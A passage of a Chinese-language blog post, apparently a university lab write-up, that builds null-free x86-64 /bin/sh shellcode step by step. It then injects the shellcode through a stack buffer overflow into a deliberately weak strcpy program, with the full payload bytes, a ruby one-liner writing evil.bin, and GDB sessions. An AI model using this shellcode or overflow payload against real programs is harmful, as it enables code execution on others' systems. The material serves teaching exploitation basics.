class="keyword">function</span></span><br></pre></td></tr></table></figure>
<p>　　使用gcc将这段代码汇编成可执行文件，然后使用GDB跟踪调试，发现执行完<code>syscall</code>指令后，该进程正常退出，这表明我们设计的代码能够正常产生<code>exit</code>系统调用。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line">[Inferior 1 (process 764) exited normally]</span><br><span class="line">warning: Error removing breakpoint -9</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>　　不过，经过测试(其实就是依次修改各个参数寄存器的值，查看程序能否正常退出)，我们会发现，列出的5点需求中，只有第1、3、5点需求是必要的，其余两点需求可以忽略，因此，我们的代码可以继续精简两行，直接把<code>movq $0x0, %rdx</code>和<code>movq $0x3c, %rsi</code>删掉即可。<br>　　至此，我们可以将两串代码拼接在一起：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell_2.s</span></span><br><span class="line">main:</span><br><span class="line">    jmp bbb</span><br><span class="line">aaa:</span><br><span class="line">    movq <span class="variable">$0x0</span>, %rax</span><br><span class="line">    movq %rax, 0x8(%rsp)</span><br><span class="line">    movq 0x0(%rsp), %rdi</span><br><span class="line">    lea 0x0(%rsp), %rsi</span><br><span class="line">    movq <span class="variable">$0x0</span>, %rdx</span><br><span class="line">    movl <span class="variable">$0x3b</span>, %eax</span><br><span class="line">    syscall</span><br><span class="line">    movl <span class="variable">$0xe7</span>, %eax</span><br><span class="line">    movq <span class="variable">$0x0</span>, %rdi</span><br><span class="line">    syscall</span><br><span class="line">bbb:</span><br><span class="line">    callq aaa</span><br><span class="line">    .string <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">    .global main</span><br><span class="line">    .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
<p>　　这个程序不仅能够产生<code>execve</code>系统调用，执行shell，还能在<code>execve</code>系统调用失败时正常退出，以免发生错误。理论上来说，这段代码已经基本满足我们对<strong>shell code</strong>的功能需求，然而，它却无法使用。为了说明这一点，我们可以查看一下这些指令对应的机器码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">3130104006@hamsa:~/project2$ objdump -d shell_2 | grep -A20 <span class="string">'&lt;main&gt;'</span></span><br><span class="line">0000000000401164 &lt;main&gt;:</span><br><span class="line">  401164:	eb 30                	jmp    401196 &lt;bbb&gt;</span><br><span class="line"></span><br><span class="line">0000000000401166 &lt;aaa&gt;:</span><br><span class="line">  401166:	48 c7 c0 00 00 00 00 	mov    <span class="variable">$0x0</span>,%rax</span><br><span class="line">  40116d:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  401172:	48 8b 3c 24          	mov    (%rsp),%rdi</span><br><span class="line">  401176:	48 8d 34 24          	lea    (%rsp),%rsi</span><br><span class="line">  40117a:	48 c7 c2 00 00 00 00 	mov    <span class="variable">$0x0</span>,%rdx</span><br><span class="line">  401181:	b8 3b 00 00 00       	mov    <span class="variable">$0x3b</span>,%eax</span><br><span class="line">  401186:	0f 05                	syscall</span><br><span class="line">  401188:	b8 e7 00 00 00       	mov    <span class="variable">$0xe7</span>,%eax</span><br><span class="line">  40118d:	48 c7 c7 00 00 00 00 	mov    <span class="variable">$0x0</span>,%rdi</span><br><span class="line">  401194:	0f 05                	syscall</span><br><span class="line"></span><br><span class="line">0000000000401196 &lt;bbb&gt;:</span><br><span class="line">  401196:	e8 cb ff ff ff       	callq  401166 &lt;aaa&gt;</span><br><span class="line">  40119b:	2f                   	(bad)</span><br><span class="line">  40119c:	62                   	(bad)</span><br><span class="line">  40119d:	69 6e 2f 73 68 00 90 	imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br><span class="line">  4011a4:	90                   	nop</span><br></pre></td></tr></table></figure>
<p>　　注意到，我们设计的汇编代码在翻译成机器指令后，出现了大量的<code>\x00</code>字段，这在代码注入环节是不可接受的！因为<code>buffer overflow</code>的攻击目标是那些使用了<strong>批量写内存</strong>操作的程序，比如常见的<code>gets()</code>、<code>strcpy</code>函数，这些函数一般具有同一个特征——<strong>没有指定向内存中写多少字节</strong>。举个例子，对于字符串拷贝函数<code>strcpy</code>，它以字节为单位，从源地址读取数据，向目的地址写入数据，然后源地址和目的地址同时递增，继续下一次拷贝，直至遇到<code>\x00</code>时终止操作，因为这是字符串的结束标记。由此可见，假设我们利用<code>strcpy</code>函数将之前设计的机器码注入到内存，那么仅有第一个<code>\x00</code>前面的内容(这里即<code>\xeb\x29\x48\xc7\c0</code>)能够注入，后面的内容都将被忽略，这显然是一次失败的攻击。<br>　　为了解决这一缺陷，我们需要人为地消除<code>\x00</code>。幸运的是，我们的攻击目标是一台<code>x86</code>的机器，<code>CISC</code>架构使得它的指令长度是不固定的，从而能够获得非常高的指令密度，我们利用这一特性，可以对设计的指令做一些小的修改，消除<code>\x00</code>的存在。具体如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    <span class="variable">$0x0</span>,%rax       ----&gt;      xor    %rax,%rax</span><br><span class="line">movq    <span class="variable">$0x0</span>,%rdx       ----&gt;      xor    %rdx,%rdx</span><br><span class="line">movl    <span class="variable">$0x3b</span>,%eax      ----&gt;      movb    <span class="variable">$0x3b</span>,%al</span><br></pre></td></tr></table></figure></p>
<p>　　其实原理很简单，无非就是消除立即数中的<code>\x00</code>字段，这可以通过使用其他指令或者分割立即数来实现。<br>　　最终我们得到的无<code>\x00</code>版汇编代码如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell_3.s</span></span><br><span class="line">main:</span><br><span class="line">    jmp bbb</span><br><span class="line">aaa:</span><br><span class="line">    xor %rax, %rax</span><br><span class="line">    movq %rax, 0x8(%rsp)</span><br><span class="line">    movq 0x0(%rsp), %rdi</span><br><span class="line">    lea 0x0(%rsp), %rsi</span><br><span class="line">    xor %rdx, %rdx</span><br><span class="line">    movb <span class="variable">$0x3b</span>, %al</span><br><span class="line">    syscall</span><br><span class="line">    xor %rax, %rax</span><br><span class="line">    movb <span class="variable">$0xe7</span>, %al</span><br><span class="line">    xor %rdi, %rdi</span><br><span class="line">    syscall</span><br><span class="line">bbb:</span><br><span class="line">    callq aaa</span><br><span class="line">    .string <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">    .global main</span><br><span class="line">    .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br></pre></td></tr></table></figure></p>
<p>　　对应机器码如下所示，可以看到代码部分已经不存在<code>\x00</code>字段了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">3130104006@hamsa:~/project2$ objdump -d shell_3 | grep -A20 <span class="string">'&lt;main&gt;'</span></span><br><span class="line">0000000000401164 &lt;main&gt;:</span><br><span class="line">  401164:	eb 21                	jmp    401187 &lt;bbb&gt;</span><br><span class="line"></span><br><span class="line">0000000000401166 &lt;aaa&gt;:</span><br><span class="line">  401166:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">  401169:	48 89 44 24 08       	mov    %rax,0x8(%rsp)</span><br><span class="line">  40116e:	48 8b 3c 24          	mov    (%rsp),%rdi</span><br><span class="line">  401172:	48 8d 34 24          	lea    (%rsp),%rsi</span><br><span class="line">  401176:	48 31 d2             	xor    %rdx,%rdx</span><br><span class="line">  401179:	b0 3b                	mov    <span class="variable">$0x3b</span>,%al</span><br><span class="line">  40117b:	0f 05                	syscall</span><br><span class="line">  40117d:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">  401180:	b0 e7                	mov    <span class="variable">$0xe7</span>,%al</span><br><span class="line">  401182:	48 31 ff             	xor    %rdi,%rdi</span><br><span class="line">  401185:	0f 05                	syscall</span><br><span class="line"></span><br><span class="line">0000000000401187 &lt;bbb&gt;:</span><br><span class="line">  401187:	e8 da ff ff ff       	callq  401166 &lt;aaa&gt;</span><br><span class="line">  40118c:	2f                   	(bad)</span><br><span class="line">  40118d:	62                   	(bad)</span><br><span class="line">  40118e:	69 6e 2f 73 68 00 90 	imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br></pre></td></tr></table></figure></p>
<p>　　需要注意的是，不只是<code>\x00</code>，在某些场景下，<code>\x0A</code>、<code>\x0D</code>、<code>\x20</code>以及<code>\x08</code>这些特殊字符也会影响到代码的注入，这个就要具体问题具体分析了，不能一概而论，总之，大家可以暂时忽略这些隐患，而在真正注入代码时，观察能否注入成功，如果不能，再根据具体原因来修改代码，千万不要空想代码可能存在哪些bug。<br>　　我最初做到这里的时候，就直接开始做下一步工作了，但事实上这段代码还存在一个问题，虽然现在单独使用并没有任何影响，但在真正注入时会使得攻击失效。为了方便，我直接在这里提出来，其实就是字符串末尾必须填入一个<code>\x00</code>，否则传入<code>execve</code>的参数不再是<code>/bin/sh</code>字符串，而是<code>/bin/sh***</code>，这样会导致系统调用失败；同时，又考虑到<code>\x00</code>会终止整个的代码的注入，所以我们不能简单地补上一个<code>\x00</code>。这时我们该怎么做呢？答案其实也不难，直接在代码里对字符串末尾的字节进行修改，赋值为0就好了嘛！所以，<strong>最终</strong>我们将使用的shell code是这样的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    jmp bbb</span><br><span class="line">aaa:</span><br><span class="line">    xor %rax, %rax</span><br><span class="line">    movq %rax, 0x8(%rsp)</span><br><span class="line">    movq 0x0(%rsp), %rdi</span><br><span class="line">    movb %al, 0x7(%rdi) <span class="comment"># %rdi为字符串起始地址，这里就是将第8个字符赋值为0</span></span><br><span class="line">    lea 0x0(%rsp), %rsi</span><br><span class="line">    movb <span class="variable">$0x3b</span>, %al</span><br><span class="line">    syscall</span><br><span class="line">    xor %rax, %rax</span><br><span class="line">    movb <span class="variable">$0xe7</span>, %al</span><br><span class="line">    xor %rdi, %rdi</span><br><span class="line">    syscall</span><br><span class="line">bbb:</span><br><span class="line">    callq aaa</span><br><span class="line">    .string <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">    .global main</span><br><span class="line">    .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br></pre></td></tr></table></figure>
<p>　　需要注意的是，不同于前面几版的shell code，最终版的程序是无法单独运行的，因为指令<code>movb %al, 0x7(%rdi)</code>有对代码段(code section，只读区域)进行修改，这是不被允许的，所以程序在执行到这条指令时，会产生错误<code>Segmentation fault (core dumped)</code>。但不用担心，当我们将这段代码注入到目标程序以后，它又是可以运行的了！因为我们是将代码注入到目标程序的栈中，我们知道栈空间的数据是可以修改的，不像代码段那样只可读不可写。<br>　  不过为了证明最终的代码可以工作，我们还是能设计一个简单的测试程序来验证的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test_final.c</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"</span>;</span><br><span class="line"><span class="comment">// 汇编代码翻译后得到的机器码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> *ret;</span><br><span class="line">        ret = (<span class="keyword">long</span> <span class="keyword">long</span> *)&amp;ret + <span class="number">0x2</span>; <span class="comment">// 这一步有些tricky，其实作用就是使ret指向函数返回地址</span></span><br><span class="line">        *ret = (<span class="keyword">long</span> <span class="keyword">long</span>)shellcode; <span class="comment">// 有了上一步，这里我们就可以修改返回地址，使程序跳转到shellcode</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>　　这里稍微解释一下程序中最为关键的一步：<code>ret = (long long *)&amp;ret + 0x2;</code>。参照我的另一篇博文<a href="http://121.42.178.158/buffer-overflow-theory" target="_blank" rel="noopener">Buffer Overflow(理论篇)</a>，在程序执行过程中，栈的结构是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stack</span></span><br><span class="line">                 +----------------+</span><br><span class="line">entry %rbp ----&gt; |.. prev frame ..|</span><br><span class="line">                 |                |</span><br><span class="line">                 |                |</span><br><span class="line">                 +----------------+</span><br><span class="line">entry %rsp ----&gt; | <span class="built_in">return</span> address | <span class="comment"># 我们要修改的是这个位置</span></span><br><span class="line">                 +----------------+</span><br><span class="line">new %rbp   ----&gt; |   saved %rbp   |</span><br><span class="line">                 +----------------+</span><br><span class="line">                 |     Local      | <span class="comment"># &lt;------ ret指针就在这里</span></span><br><span class="line">new %rsp   ----&gt; |   Variables    |</span><br><span class="line">                 +----------------+</span><br></pre></td></tr></table></figure></p>
<p>　　对于64位系统，<code>return address</code>、<code>saved %rbp</code>以及<code>long long *</code>所占用的空间都是8字节，因此，<code>return address</code>的地址要比<code>ret</code>的地址大16个字节，也就是<strong>2</strong>个<code>long long *</code>的长度！这么一说，想必大家都已经明白<code>ret = (long long *)&amp;ret + 0x2</code>的原理了，它最终会使得<code>ret</code>指向函数返回地址，从而我们能够通过修改<code>*ret</code>来实现对返回地址的修改。   　　<br>　　最终测试程序运行如下所示：<br>　<img src="http://static.zybuluo.com/hac/73mrfpgsumtjebroggovldju/Selection_095.png" alt="Selection_095.png-103kB"><br>　　至此，第一部分工作正式完成，我们已经为<code>buffer overflow</code>攻击打下了很好的基础，下面就是真正的实践了。</p>
<h2 id="Exploit-Buffer-Overflow-with-GDB"><a href="#Exploit-Buffer-Overflow-with-GDB" class="headerlink" title="Exploit Buffer Overflow with GDB"></a>Exploit Buffer Overflow with GDB</h2><p>　　我们已经完成<code>恶意代码</code>的设计，下面我们开始尝试将代码注入到一个很<code>weak</code>的程序中，使它能够按照我们的意愿来工作(其实就是执行shell啦)。目标程序代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// victim.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *arg)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	foo(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译目标代码</span></span><br><span class="line">3130104006@hamsa:~/project3$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim</span><br><span class="line"><span class="comment"># -g 表示生成调试信息，方便使用GDB调试</span></span><br><span class="line"><span class="comment"># -Wall 表示打开警告开关，提示所有warning信息</span></span><br><span class="line"><span class="comment"># -fno-stack-protector 表示禁用栈保护机制，如果没有这个选项，本次实验无法完成。这里的栈保护机制其实就是canary</span></span><br><span class="line"><span class="comment"># -z execstack 表示允许栈可执行，没有这个选项，本次实验也无法完成</span></span><br><span class="line"><span class="comment"># -static 表示静态链接</span></span><br></pre></td></tr></table></figure>
<p>　　为什么说这个程序很<code>weak</code>呢？这里用过<code>Visual Studio</code>的同学一定很有感受，如果我们的工程里有使用<code>gets</code>、<code>strcpy</code>这样的函数，那么编译时IDE一定会抱怨这些函数是<code>dangerous</code>的，蛋疼的是，它报的不是warning，而是error，这样也就导致工程无法编译。我们的目标程序刚好使用到了<code>strcpy</code>函数，这让我们有可趁之机，因为该函数并没有做边界限制，理论上来说，只要不遇到终止符<code>\x00</code>，它就会一直进行内存拷贝，我们利用这一特性，可以输入一串很长的数据，然后通过<code>strcpy</code>拷贝到本地变量<code>buffer</code>中，但由于我们输入的数据长度要超过buffer的长度，甚至还会覆盖到<code>foo</code>函数的返回地址字段，所以我们还能利用输入的数据将函数返回地址修改掉，使程序返回时跳到我们规定的位置(一般是注入代码的起始地址，也就是buffer的地址)，执行我们注入的代码，这就是<code>buffer overflow</code>攻击的一种实现原理。<br>　　根据实验原理，为了实现攻击，除了需要一段恶意代码之外，我们还需要知道这段恶意代码注入到内存中后的起始地址，如此才能正确覆写程序返回地址。这里，我们可以使用GDB来跟踪程序的运行，查看程序进入<code>foo</code>函数后，buffer的起始地址是多少。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debug victim program with GDB</span></span><br><span class="line">   ┌─────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">   │0x401164 &lt;foo&gt;          push   %rbp                                      │</span><br><span class="line">   │0x401165 &lt;foo+1&gt;        mov    %rsp,%rbp                                 │</span><br><span class="line">   │0x401168 &lt;foo+4&gt;        sub    <span class="variable">$0x50</span>,%rsp                                │</span><br><span class="line">   │0x40116c &lt;foo+8&gt;        mov    %rdi,-0x48(%rbp)                          │</span><br><span class="line">   │0x401170 &lt;foo+12&gt;       mov    -0x48(%rbp),%rdx <span class="comment"># 将argv[1]的地址赋给%rdx│</span></span><br><span class="line">   │0x401174 &lt;foo+16&gt;       lea    -0x40(%rbp),%rax <span class="comment"># 将buffer的地址赋给%rax │</span></span><br><span class="line">  &gt;│0x401178 &lt;foo+20&gt;       mov    %rdx,%rsi <span class="comment"># 程序暂时停在这个位置          │</span></span><br><span class="line">   │0x40117b &lt;foo+23&gt;       mov    %rax,%rdi                                 │</span><br><span class="line">   │0x40117e &lt;foo+26&gt;       callq  0x400320 <span class="comment"># strcpy函数调用                 │</span></span><br><span class="line">   │0x401183 &lt;foo+31&gt;       leaveq                                           │</span><br><span class="line">   │0x401184 &lt;foo+32&gt;       retq                                             │</span><br><span class="line">   └─────────────────────────────────────────────────────────────────────────┘</span><br><span class="line">child process 17315 In: foo                           Line: 6    PC: 0x401178</span><br><span class="line">(gdb) p/x <span class="variable">$rax</span></span><br><span class="line"><span class="variable">$1</span> = 0x7fffffffe3d0 <span class="comment"># 根据0x401174这条指令，我们知道buffer地址存放在%rax寄存器中</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
<p>　　由上，我们知道buffer的起始地址是<code>0x7fffffffe3d0</code>，理论上来说，这个应该就是注入代码的起始地址了。有的同学可能会怀疑这个地址只是一个随机数，下次执行时就不一样了。这样的想法非常合理，然而，如果再多测试几次，我们会惊讶地发现，这个值还真是固定的，并不是随机分配的。这是因为，GDB默认会关闭<code>stack randomization</code>，也就是说，在不受其他外界因素影响的前提下，调试程序每次开始执行时的栈顶地址都是固定的，从而buffer的地址也不会变。我们可以通过<code>show disable-randomization</code>来查看GDB是否已关闭<code>stack-randomization</code>，也可以通过<code>set disable-randomization on/off</code>修改这一选项：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) show <span class="built_in">disable</span>-randomization</span><br><span class="line">Disabling randomization of debuggee<span class="string">'s virtual address space is on.</span></span><br><span class="line"><span class="string">(gdb) set disable-randomization off</span></span><br><span class="line"><span class="string">(gdb) set disable-randomization on</span></span><br><span class="line"><span class="string">(gdb)</span></span><br></pre></td></tr></table></figure></p>
<p>　　好，现在我们有了恶意代码，也有了代码注入后的起始地址，接下来就是研究栈的结构，方便我们准确地修改到函数返回地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stack for foo function</span></span><br><span class="line">                 +----------------+</span><br><span class="line">                 |      ...       | <span class="comment"># main function's frame</span></span><br><span class="line">                 +----------------+</span><br><span class="line">                 | <span class="built_in">return</span> address | <span class="comment"># 我们要修改的是这个位置</span></span><br><span class="line">                 +----------------+</span><br><span class="line">    %rbp   ----&gt; |   saved %rbp   |</span><br><span class="line">                 +----------------+</span><br><span class="line">                 |  buffer[63:56] |</span><br><span class="line">                 |  buffer[55:48] |</span><br><span class="line">                 |  buffer[47:40] |</span><br><span class="line">                 |  buffer[39:32] |</span><br><span class="line">                 |  buffer[31:24] |</span><br><span class="line">                 |  buffer[23:16] |</span><br><span class="line">                 |  buffer[15:8]  |</span><br><span class="line">                 |  buffer[7:0]   | <span class="comment"># 地址为0x7fffffffe3d0</span></span><br><span class="line">                 |      ...       |</span><br><span class="line">    %rsp   ----&gt; |      ...       |</span><br><span class="line">                 +----------------+</span><br></pre></td></tr></table></figure></p>
<p>　　我们输入的数据将会从<code>buffer[0]</code>开始，一直往上填充，直至将<code>return address</code>字段修改。我们的实验主机为64位系统，可以计算出，我们需要至少先输入<code>72</code>字节的数据，才能开始修改<code>return address</code>字段，而我们希望将返回地址修改为<code>0x7fffffffe3d0</code>，所以，我们总共需要输入<code>78</code>字节的数据。下面，我们来构造输入数据。<br>　　首先，毋庸置疑，我们需要将恶意代码作为输入数据的一部分，这里我把它放在输入数据的最前方：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恶意代码总共50字节</span></span><br><span class="line">\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure></p>
<p>　　现在我们还22个字节才能达到<code>72</code>字节，而事实上，这22个字节的数据是不起作用的，因为程序执行完恶意代码后就会自动退出，所以这22个字节我们可以自己随便凑，但是注意别作死地选<code>\x00</code>、<code>\x20</code>这样的数，它们会终止代码的注入，这里我建议大家使用<code>\x90</code>，因为这在<code>x86</code>机器上是<code>NOP</code>指令的机器码，所以不管我们把<code>\x90</code>添加在什么位置(可以在恶意代码前，也可以在恶意代码中，只要不是一条指令中间–!)，都不会影响程序的正常执行。<br>　　通过添加<code>\x90</code>将数据填充到72字节后，我们就可以将地址<code>0x7fffffffe3d0</code>添加到输入数据的末尾：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh\x90...\x90\xd0\xe3\xff\xff\xff\x7f</span><br></pre></td></tr></table></figure></p>
<p>　　这里千万要注意小端机与大端机的区别，这会影响到地址<code>0x7fffffffe3d0</code>的表示，在小端机里，它要通过<code>\xd0\xe3\xff\xff\xff\x7f</code>来表示。<br>　　我们将构造的输入数据保存到文件<code>evil.bin</code>中，方便以后使用。继续使用GDB调试，以<code>evil.bin</code>文件内容作为输入，运行目标程序，观察攻击是否生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">3130104006@hamsa:~/project3$ ruby -e <span class="string">'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\xd0\xe3\xff\xff\xff\x7f"'</span> &gt; evil.bin</span><br><span class="line">3130104006@hamsa:~/project3$ gdb -q victim</span><br><span class="line">Reading symbols from /home/3130104006/project3/victim...done.</span><br><span class="line">(gdb) b foo</span><br><span class="line">Breakpoint 1 at 0x401170: file victim.c, line 6.</span><br><span class="line">(gdb) r `cat evil.bin`</span><br><span 